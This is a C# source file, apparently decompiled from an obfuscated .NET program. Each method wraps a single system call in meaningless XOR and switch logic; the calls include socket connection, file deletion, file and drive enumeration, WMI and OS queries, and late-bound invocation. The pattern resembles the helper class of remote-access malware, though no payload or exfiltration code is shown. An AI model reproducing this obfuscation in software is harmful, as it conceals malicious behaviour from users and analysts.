using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security;
using System.Text;
using System.Threading;
using System.Timers;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace ns0;

internal sealed class Class16
{
	internal static StringBuilder smethod_0<T>(T gparam_0, char char_0, char char_1, char char_2) where T : StringBuilder
	{
		int num = 0;
		StringBuilder result;
		do
		{
			result = (((char_2 ^ char_1) - 41) ^ num) switch
			{
				0 => gparam_0.Append(char_0), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static string smethod_1<T>(T gparam_0, int int_0, int int_1) where T : ResolveEventArgs
	{
		int num = 0;
		string result = (((int_1 ^ int_0) - 111) ^ 0) switch
		{
			0 => (string)(IComparable<string>)gparam_0.Name, 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_2<T, U>(U gparam_0, T gparam_1, char char_0, char char_1) where T : string where U : string
	{
		int num = 0;
		string result = (((char_0 ^ char_1) - 112) ^ 0) switch
		{
			0 => (string)(IComparable)string.Concat(gparam_0, gparam_1), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static object smethod_3<T>(T gparam_0, object[] object_0, string[] string_0, char char_0, int int_0)
	{
		int num = 0;
		object result;
		do
		{
			result = (((int_0 ^ char_0) - 29) ^ num) switch
			{
				0 => NewLateBinding.LateIndexGet((object)gparam_0, object_0, string_0), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static void smethod_4(int int_0, int int_1, char char_0)
	{
		int num = 0;
		do
		{
			switch (((int_1 ^ char_0) - 52) ^ num)
			{
			case 0:
				Thread.Sleep(int_0);
				break;
			}
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
	}

	internal static void smethod_5<T>(T gparam_0, int int_0, short short_0) where T : Thread
	{
		int num = 0;
		int num2;
		do
		{
			switch (((int_0 ^ short_0) - 66) ^ num)
			{
			case 0:
				gparam_0.Start();
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static object smethod_6<T, U, V>(V gparam_0, T gparam_1, U gparam_2, object[] object_0, string[] string_0, Type[] type_0, bool[] bool_0, bool bool_1, int int_0, int int_1) where T : Type where U : string
	{
		int num = 0;
		object result = (((int_1 ^ int_0) - 1) ^ 0) switch
		{
			0 => NewLateBinding.LateCall((object)gparam_0, (Type)gparam_1, (string)gparam_2, object_0, string_0, type_0, bool_0, bool_1), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_7<T, U>(U gparam_0, T gparam_1, int int_0, short short_0) where T : ElapsedEventHandler where U : System.Timers.Timer
	{
		int num = 0;
		int num2;
		do
		{
			switch (((int_0 ^ short_0) - 107) ^ num)
			{
			case 0:
				gparam_0.Elapsed += gparam_1;
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static void smethod_8<T>(T gparam_0, char char_0, short short_0) where T : string
	{
		int num = 0;
		int num2;
		do
		{
			switch (((char_0 ^ short_0) - 15) ^ num)
			{
			case 0:
				File.Delete(gparam_0);
				break;
			}
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static object smethod_9<T, U>(T gparam_0, U gparam_1, short short_0, short short_1) where T : ManagementBaseObject where U : string
	{
		int num = 0;
		object result;
		do
		{
			result = (((short_0 ^ short_1) - 36) ^ num) switch
			{
				0 => ((ManagementBaseObject)gparam_0).get_Item((string)gparam_1), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static string smethod_10<T>(T gparam_0, short short_0, int int_0) where T : DriveInfo
	{
		int num = 0;
		string result = (((int_0 ^ short_0) - 50) ^ 0) switch
		{
			0 => (string)(IEnumerable<char>)gparam_0.Name, 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_11<T>(T gparam_0, short short_0, short short_1) where T : TcpClient
	{
		int num = 0;
		switch (((short_0 ^ short_1) - 124) ^ 0)
		{
		case 0:
			gparam_0.Close();
			break;
		}
		num++;
	}

	internal static byte[] smethod_12<T>(T gparam_0, int int_0, char char_0) where T : MemoryStream
	{
		int num = 0;
		byte[] result = (((char_0 ^ int_0) - 22) ^ 0) switch
		{
			0 => gparam_0.ToArray(), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static Assembly smethod_13(int int_0, short short_0)
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		int num = 0;
		Assembly result = (((short_0 ^ int_0) - 23) ^ 0) switch
		{
			0 => (Assembly)(IEvidenceFactory)Assembly.GetExecutingAssembly(), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static Assembly smethod_14<T>(T gparam_0, char char_0, short short_0) where T : Type
	{
		int num = 0;
		Assembly result = (((short_0 ^ char_0) - 26) ^ 0) switch
		{
			0 => gparam_0.Assembly, 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_15<T>(T gparam_0, short short_0, short short_1) where T : ComputerInfo
	{
		int num = 0;
		string result;
		do
		{
			result = (((short_0 ^ short_1) - 74) ^ num) switch
			{
				1 => (string)(IEnumerable<char>)((ComputerInfo)gparam_0).get_OSVersion(), 
				0 => (string)(IEnumerable<char>)((ComputerInfo)gparam_0).get_OSFullName(), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static string smethod_16(string[] string_0, short short_0, int int_0)
	{
		int num = 0;
		string result;
		do
		{
			result = (((short_0 ^ int_0) - 45) ^ num) switch
			{
				0 => (string)(IEnumerable)string.Concat(string_0), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static void smethod_17<T, U>(T gparam_0, U gparam_1, int int_0, short short_0) where T : Socket where U : EndPoint
	{
		int num = 0;
		do
		{
			switch (((int_0 ^ short_0) - 46) ^ num)
			{
			case 0:
				gparam_0.Connect(gparam_1);
				break;
			}
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
	}

	internal static string[] smethod_18<T, U>(U gparam_0, T gparam_1, int int_0, short short_0) where T : string where U : string
	{
		int num = 0;
		string[] result = (((short_0 ^ int_0) - 112) ^ 0) switch
		{
			0 => Directory.GetFiles(gparam_0, gparam_1), 
			_ => null, 
		};
		num++;
		return result;
	}
}
